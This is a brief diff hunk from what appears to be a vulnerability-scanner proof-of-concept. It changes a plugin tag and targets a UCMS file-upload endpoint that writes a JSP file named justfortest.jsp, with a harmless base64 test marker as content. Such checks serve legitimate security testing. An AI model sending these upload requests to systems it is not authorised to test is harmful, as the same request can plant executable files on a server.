@@ -18,7 +18,7 @@ def prove(data):
     dGVzdCBieSBtZQ==
     </root>
     '''
-    data = init(data,'web')
+    data = init(data,'ucms')
     if data['base_url']:
         for url in [data['base_url'], data['url']]:
             myurl = url + '/ucms/cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
